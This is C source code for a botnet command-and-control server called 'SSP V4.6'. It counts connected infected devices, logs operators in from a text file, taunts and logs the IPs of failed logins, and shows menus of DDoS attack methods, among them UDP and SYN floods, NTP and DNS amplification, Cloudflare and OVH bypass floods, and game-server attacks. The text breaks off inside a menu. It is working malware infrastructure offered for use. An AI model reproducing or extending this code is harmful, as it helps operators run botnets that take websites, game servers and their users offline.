////////////////////////////////
//       [ SSP ] VerseX       //
////////////////////////////////
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define MAXFDS 1000000
#define MAX_THREADS 1000

struct login_info 
{
	char username[100];
	char password[5000];
};

static struct login_info accounts[5000];

struct clientdata_t 
{
        uint32_t ip;
        char connected;
} clients[MAXFDS];

struct telnetdata_t 
{
    int connected;
	char ipuser[116];
} managements[MAXFDS];

struct args 
{
    int sock;
    struct sockaddr_in cli_addr;
};

static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int attacksRunning = 0;
static volatile int totalAttacks = 0;
static volatile int maxAttacksRunning = 10;
static volatile int scannerreport;

char client_ip[INET_ADDRSTRLEN];

pthread_t attackTimeThreads[MAX_THREADS];
int num_threads = 0;

int fdgets(unsigned char *buffer, int bufferSize, int fd) 
{
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}

////////////////////////////////
//      Username IP SYNC      //
////////////////////////////////

int client_count = 0;  // Global variable to keep track of number of connected clients

void add_client_info(struct sockaddr_in cli_addr, char *username) 
{
    if (client_count < MAXFDS) 
	{
        sprintf(managements[client_count].ipuser, "%s:%s", client_ip, username);
        managements[client_count].connected = 1;
        printf("Stored client info: %s\n", managements[client_count].ipuser);

        client_count++;
    } 
	else 
	{
        printf("Max number of clients reached.\n");
    }
}

void remove_client_info(int index) 
{
    if (index >= 0 && index < client_count) 
	{
        managements[index].connected = 0;
        printf("Removed client info: %s\n", managements[index].ipuser);

        // Shift all elements after the removed client one index to the left
		int i;

        for (i = index; i < client_count - 1; i++) 
		{
            managements[i] = managements[i + 1];
        }

        client_count--;
    }
}

void get_username(const char *client_ip, char *username) 
{
    int i;

    printf("Client_Address: %s\n", client_ip);

    for (i = 0; i < MAXFDS; i++) 
	{
        if (managements[i].connected == 1) 
		{
            if (strstr(managements[i].ipuser, client_ip) != NULL) 
			{
                char *delimiter = strchr(managements[i].ipuser, ':');
                if (delimiter != NULL) 
				{
                    strncpy(username, delimiter + 1, sizeof(managements[i].ipuser));
                } 
				else 
				{
                    strcpy(username, "");
                }
                break;
            }
        }
    }
}

void trim(char *str) 
{
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking (int sfd) 
{
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) 
	{
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) 
	{
		perror ("fcntl");
		return -1;
	}
	return 0;
}

static int create_and_bind (char *port) 
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) 
	{
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) 
	{
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) 
		{
			break;
		}
		close (sfd);
	}
	if (rp == NULL) 
	{
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}

void* attacksRunningTimer(void* arg) {
    // Increment the operatorsConnected variable
    attacksRunning++;

    // Wait for the specified number of seconds
    int seconds_to_wait = *((int*) arg);

    time_t start_time = time(NULL);
    while (time(NULL) < start_time + seconds_to_wait) 
    {
        pthread_testcancel();
    }

    // Decrement the operatorsConnected variable
    attacksRunning--;

    return NULL;
}

void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[0;34m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}

void *BotEventLoop(void *useless) 
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) 
	{
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) 
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) 
			{
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) 
			{
            	while (1) 
			   	{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else 
					{
						perror ("accept");
						break;
					}
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) 
				{
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) 
					{
						dup = 1;
						break;
					}
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) 
				{ 
					close(infd); break; 
				}
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) 
				{
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
				}
				continue;
				}
				else 
				{
				int datafd = events[i].data.fd;
				struct clientdata_t *client = &(clients[datafd]);
				int done = 0;
				client->connected = 1;
				while (1) 
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);
					while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) 
					{
						if(strstr(buf, "\n") == NULL) 
						{ 
							done = 1; break; 
						}
						trim(buf);
						if(strcmp(buf, "PING") == 0) 
						{
							if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
							continue;
						}
						if(strstr(buf, "PROBING") == buf) 
						{
							char *line = strstr(buf, "PROBING");
							scannerreport = 1;
							continue;
						}
						if(strstr(buf, "REMOVING PROBE") == buf) 
						{
							char *line = strstr(buf, "REMOVING PROBE");
							scannerreport = 0;
							continue;
						}
						if(strcmp(buf, "PONG") == 0) 
						{
							continue;
						}
						printf("%s\n", buf);
					}
					if (count == -1) 
					{
						if (errno != EAGAIN) 
						{
							done = 1;
						}
						break;
					}
					else if (count == 0) 
					{
						done = 1;
						break;
					}
					if (done) 
					{
						client->connected = 0;
						close(datafd);
					}
				}
			}
		}
	}
}

unsigned int BotsConnected() 
{
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) 
	{
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}

int Find_Login(char *str) 
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL)
	{
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL)
	{
        if((strstr(temp, str)) != NULL)
		{
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) 
{
	memset(managements, 0, sizeof(managements));
	client_count = 0;

	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
	pthread_t title;
	char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) 
	{
	c=fgetc(fp);
	++i;
	}

	int j=0;
	rewind(fp);
	while(j!=i-1) 
	{
	fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
	++j;
	}	
	
	char clearscreen [2048];
	memset(clearscreen, 0, 2048);
	sprintf(clearscreen, "\033[1A");
	char user [5000];	
		
    sprintf(user, "\x1b[0;36mUsername > ");
		
	if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
    if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
    trim(buf);
	char* nickstring;
	nickstring = ("%s", buf);
    find_line = Find_Login(nickstring);
	struct sockaddr_in serv_addr, cli_addr;
	add_client_info(cli_addr, buf);
    if(strcmp(nickstring, accounts[find_line].username) == 0)
	{
		char password [5000];
		if(send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
		sprintf(password, "\x1b[0;36mPassword > ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
		trim(buf);
		if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
		memset(buf, 0, 2048);
		goto Banner;
    }
	else
	{
		goto failed;
	}

	void *TitleWriter(void *sock) 
	{
		int datafd = (int)sock;
		char string[2048];
		while(1) 
		{
			memset(string, 0, 2048);
			sprintf(string, "%c]0; [/] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks, '\007');
			if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
			sleep(2);

			sprintf(string, "%c]0; [-] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks, '\007');
			if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
			sleep(2);

			sprintf(string, "%c]0; [\\] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks, '\007');
			if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
			sleep(2);

			sprintf(string, "%c]0; [|] SSP V4.6 [+] Masters: %d [+] Devices: %d [+] Running: %d/%d [+] Total Attacks: %d %c", '\033', OperatorsConnected, BotsConnected(), attacksRunning, maxAttacksRunning, totalAttacks, '\007');
			if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
			sleep(2);
		}
	}		
	
	failed:
	memset(clearscreen, 0, 2048);
	sprintf(clearscreen, "\033[2J\033[1;1H");
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

	FILE *IPLogs;
	IPLogs = fopen("ips.log", "a");
	time_t now;
	struct tm *gmt;
	char formatted_gmt [50];
	char lcltime[50];
	now = time(NULL);
	gmt = gmtime(&now);
	strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
	fprintf(IPLogs, "[%s] IP > %s User > %s\n", formatted_gmt, client_ip, nickstring);
	fclose(IPLogs);

	char skidMsg[100];

	sprintf(skidMsg, "Logging Your Ip You Skid");
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sleep(3);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "[*         ] 6%%");
	sleep(0.5);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "[**        ] 20%%");
	sleep(0.5);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "[***       ] 30%%");
	sleep(0.5);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "[****      ] 39%%");
	sleep(0.5);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "[*****     ] 53%%");
	sleep(0.5);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "[******    ] 58%%");
	sleep(0.5);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "[*******   ] 73%%");
	sleep(0.5);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "[********  ] 80%%");
	sleep(0.5);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "[********* ] 87%%");
	sleep(0.5);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "[**********] 100%%");
	sleep(0.5);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;
	sprintf(skidMsg, "IP Logged Kicking You Out Skid");
	sleep(3);
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, skidMsg, strlen(skidMsg), MSG_NOSIGNAL) == -1) return;

	sleep(3);

	if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
	goto end;
	Banner:
	pthread_create(&title, NULL, &TitleWriter, sock);

	memset(clearscreen, 0, 2048);
	sprintf(clearscreen, "\033[2J\033[1;1H");
	if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

	char ascii_banner_line1   [250];
	char ascii_banner_line2   [250];
	char ascii_banner_line3   [250];
	char ascii_banner_line4   [250];
	char ascii_banner_line5   [250];
	char ascii_banner_line6   [250];
	char ascii_banner_line7   [250];
	char ascii_banner_line8   [250];
	char ascii_banner_line9   [250];
	char ascii_banner_line10  [250];
	char ascii_banner_line11  [250];
	char ascii_banner_line12  [250];
	char ascii_banner_line13  [250];
	char ascii_banner_line14  [250];
	char ascii_banner_line15  [250];
	char ascii_banner_line16  [250];
	char ascii_banner_line17  [250];
	char ascii_banner_line18  [250];
	char ascii_banner_line19  [250];
	char ascii_banner_line20  [250];
	char ascii_banner_line21  [250];
	char ascii_banner_line22  [250];

	sprintf(ascii_banner_line1,   " \r\n");
	sprintf(ascii_banner_line2,   "\x1b[0;35m                                    ╔═╗╔═╗╔═╗\r\n");
	sprintf(ascii_banner_line3,   "\x1b[0;35m                                    ╚═╗╚═╗╠═╝\r\n");
	sprintf(ascii_banner_line4,   "\x1b[1;37m            ╔╗                      \x1b[0;35m╚═╝╚═╝╩                        \x1b[1;37m╔╗\r\n");
	sprintf(ascii_banner_line5,   "\x1b[1;37m             ╚══╦═══════════════════════════════════════════════╦══╝\r\n");
	sprintf(ascii_banner_line6,   "\x1b[1;37m                ║ \x1b[1;30m- - - \x1b[1;31mWelcome To The Power Of Skrr Skrr \x1b[1;30m- - - \x1b[1;37m║\r\n");
	sprintf(ascii_banner_line7,   "\x1b[1;37m                ║ \x1b[1;30m- - - - - - - \x1b[1;31mCreated By VerseX \x1b[1;30m- - - - - - - \x1b[1;37m║\r\n"); 
	sprintf(ascii_banner_line8,   "\x1b[1;37m           ╚════╩╦═════════════════════════════════════════════╦╩════╝\r\n"); 
	sprintf(ascii_banner_line9,   "\x1b[1;37m             ╔═══╩═════════════════════════════════════════════╩═══╗\r\n"); 
	sprintf(ascii_banner_line10,  "\x1b[1;37m             ║ \x1b[1;30m- - - - \x1b[1;31mType \x1b[1;37m[\x1b[0;35mhelp\x1b[1;37m] \x1b[1;31mFor A List Of Methods \x1b[1;30m- - - - - \x1b[1;37m║\r\n"); 
	sprintf(ascii_banner_line11,  "\x1b[1;37m             ║ \x1b[1;30m- - - \x1b[1;31mCopyright \x1b[1;37m@ \x1b[1;31m2023 SSP Cuz Yall Are Skids \x1b[1;30m- - - \x1b[1;37m║\r\n"); 
	sprintf(ascii_banner_line12,  "\x1b[1;37m        ╚════╩═════════════════════════════════════════════════════╩════╝\r\n");
	sprintf(ascii_banner_line13,  " \r\n");
	sprintf(ascii_banner_line14,  " \r\n");
	sprintf(ascii_banner_line15,  " \r\n");
	sprintf(ascii_banner_line16,  " \r\n");
	sprintf(ascii_banner_line17,  " \r\n");
	sprintf(ascii_banner_line18,  " \r\n");
	sprintf(ascii_banner_line19,  " \r\n");
	sprintf(ascii_banner_line20,  " \r\n");
	sprintf(ascii_banner_line21,  " \r\n");
	sprintf(ascii_banner_line22,  " \r\n");
			
	if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line15, strlen(ascii_banner_line15), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line16, strlen(ascii_banner_line16), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line17, strlen(ascii_banner_line17), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line18, strlen(ascii_banner_line18), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line19, strlen(ascii_banner_line19), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line20, strlen(ascii_banner_line20), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line21, strlen(ascii_banner_line21), MSG_NOSIGNAL) == -1) goto end;
	if(send(datafd, ascii_banner_line22, strlen(ascii_banner_line22), MSG_NOSIGNAL) == -1) goto end;

	while(1) 
	{
		char servTag [100];
		char input [5000];
		char username[100];
		get_username(client_ip, username);
		sprintf(servTag, "\x1b[1;35m╔══\x1b[1;37m[\x1b[0;35m%s\x1b[0;37m@\x1b[0;35mSSP\x1b[1;37m]\n", username);
		sprintf(input, "\r\x1b[1;35m╚═══\x1b[1;37m> ");
		if(send(datafd, servTag, strlen(servTag), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
	}
	
	managements[datafd].connected = 1;

	while(fdgets(buf, sizeof buf, datafd) > 0) 
	{   
		if (strncmp(buf, "METHODS", 7) == 0 || strncmp(buf, "methods", 7) == 0 || strncmp(buf, "HELP", 4) == 0 || strncmp(buf, "help", 4) == 0) 
		{
			

			char clearscreen [2048];
			memset(clearscreen, 0, 2048);
			sprintf(clearscreen, "\033[2J\033[1;1H");
			if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

			char ls1   [250];
			char ls2   [250];
			char ls3   [250];
			char ls4   [250];
			char ls5   [250];
			char ls6   [250];
			char ls7   [250];
			char ls8   [250];
			char ls9   [250];
			char ls10   [250];
			char ls11   [250];
			char ls12   [250];
			char ls13   [250];
			char ls14   [250];
			char ls15   [250];
			char ls16   [250];
			char ls17   [250];
			char ls18   [250];
			char ls19   [250];
			char ls20   [250];
			char ls21   [250];
			char ls22   [250];

			sprintf(ls1,  " \r\n");
			sprintf(ls2,  "\x1b[0;35m                              ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗                             \r\n");
			sprintf(ls3,  "\x1b[0;35m                              ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗                             \r\n");
			sprintf(ls4,  "\x1b[1;37m                  ╔╗          \x1b[0;35m╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝         \x1b[1;37m╔╗                  \r\n");
			sprintf(ls5,  "\x1b[1;37m                   ╚╦══════════════════════════════════════╦╝                   \r\n");
			sprintf(ls6,  "\x1b[1;37m                    ║            \x1b[0;35mList Of Methods           \x1b[1;37m║                    \r\n");
			sprintf(ls7,  "\x1b[1;37m                    ╚══════════════════════════════════════╝                    \r\n");
			sprintf(ls8,  "                                                                                \r\n");
			sprintf(ls9,  "\x1b[1;37m            [\x1b[0;35mHOME METHODS\x1b[1;37m]                          [\x1b[0;35mLAYER 7 METHODS\x1b[1;37m]\r\n");
			sprintf(ls10, "\x1b[1;37m╔═════════════════════════════════════╗  ╔═════════════════════════════════════╗\r\n");
			sprintf(ls11, "\x1b[1;37m║ [\x1b[0;35mUDP-RAW\x1b[1;37m] [\x1b[0;35mUDP-PPS\x1b[1;37m] [\x1b[0;35mTCP-SYN\x1b[1;37m] [\x1b[0;35mSTD\x1b[1;37m] ╠══╣ [\x1b[0;35mHTTP\x1b[1;37m] [\x1b[0;35mHTTPS\x1b[1;37m] [\x1b[0;35mCLOUDFLARE\x1b[1;37m]         ║\r\n");
			sprintf(ls12, "\x1b[1;37m║ [\x1b[0;35mHEX\x1b[1;37m] [\x1b[0;35mRANDHEX\x1b[1;37m] [\x1b[0;35mNTP-AMP\x1b[1;37m] [\x1b[0;35mDNS-AMP\x1b[1;37m] ╠══╣ [\x1b[0;35mOVH-HTTP\x1b[1;37m]                          ║\r\n");
			sprintf(ls13, "\x1b[1;37m╚════════════════════════╦════════════╝  ╚════════════╦════════════════════════╝\r\n");
			sprintf(ls14, "\x1b[1;37m                         ║       [\x1b[0;35mGAME METHODS\x1b[1;37m]       ║\r\n");
			sprintf(ls15, "\x1b[1;37m                    ╔════╩════════════════════════════╩════╗\r\n");
			sprintf(ls16, "\x1b[1;37m                    ║ [\x1b[0;35mOVH-GAME\x1b[1;37m] [\x1b[0;35mFIVEM\x1b[1;37m] [\x1b[0;35mMINECRAFT\x1b[1;37m] [\x1b[0;35mZAP\x1b[1;37m] ║\r\n");
			sprintf(ls17, "\x1b[1;37m                    ║ [\x1b[0;35mROBLOX\x1b[1;37m] [\x1b[0;35mCSGO\x1b[1;37m]                      ║\r\n");
			sprintf(ls18, "\x1b[1;37m                    ╚══════════════════════════════════════╝\r\n");
			sprintf(ls19, " \r\n");
			sprintf(ls20, " \r\n");
			sprintf(ls21, " \r\n");
			sprintf(ls22, " \r\n");

			if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;				
			if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls7,  strlen(ls7),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls9,  strlen(ls9),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls10, strlen(ls10),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls11, strlen(ls11),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls12, strlen(ls12),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls13, strlen(ls13),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls14, strlen(ls14),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls15, strlen(ls15),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls16, strlen(ls16),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls17, strlen(ls17),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls18, strlen(ls18),	MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls19, strlen(ls19), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls20, strlen(ls20), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls21, strlen(ls21), MSG_NOSIGNAL) == -1) goto end;
			if(send(datafd, ls22, strlen(ls22), MSG_NOSIGNAL) == -1) goto end;

			
			char servTag [100];
			char input [5000];
			char username[100];
			get_username(client_ip, username);
			sprintf(servTag, "\x1b[1;35m╔══\x1b[1;37m[\x1b[0;35m%s\x1b[0;37m@\x1b[0;35mSSP\x1b[1;37m]\n", username);
			sprintf(input, "\r\x1b[1;35m╚═══\x1b[1;37m> ");
		}
				
		else if (strncmp(buf, "HOME", 4) == 0) 
		{
			

			char clearscreen [2048];
			memset(clearscreen, 0, 2048);
			sprintf(clearscreen, "\033[2J\033[1;1H");
			if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

			char ls1   [160];
			char ls2   [160];
			char ls3   [160];
			char ls4   [160];
			char ls5   [160];
			char ls6   [160];
			char ls7   [160];
			char ls8   [160];
			char ls9   [160];
			char ls10  [160];
			char ls11  [160];
			char ls12  [160];
			char ls13  [160];
			char ls14  [160];
			char ls15  [160];
			char ls16  [160];
			char ls17  [160];
			char ls18  [160];
			char ls19  [160];
			char ls20  [160];
			char ls21  [160];
			char ls22  [160];

			sprintf(ls1,  " \r\n");
			sprintf(ls2,  "\x1b[0;35m                                  ╦ ╦╔═╗╔╦╗╔═╗                                  \r\n");
			sprintf(ls3,  "\x1b[0;35m                                  ╠═╣║ ║║║║║╣                                   \r\n");
			sprintf(ls4,  "\x1b[1;37m                  ╔╗              \x1b[0;35m╩ ╩╚═╝╩ ╩╚═╝              \x1b[1;37m╔╗                  \r\n");
			sprintf(ls5,  "\x1b[1;37m                   ╚╦══════════════════════════════════════╦╝                   \r\n");
			sprintf(ls6,  "\x1b[1;37m                    ║          \x1b[0;35mList Of Home Methods        \x1b[1;37m║                    \r\n");
			sprintf(ls7,  "\x1b[1;37m                    ╚════╦════════════════════════════╦════╝\r\n");
			sprintf(ls8,  "\x1b[1;37m                         ║                            ║\r\n");
			sprintf(ls9,  "\x1b[1;37m╔════════════════════════╩════════════════════════════╩════════════════════════╗\r\n");
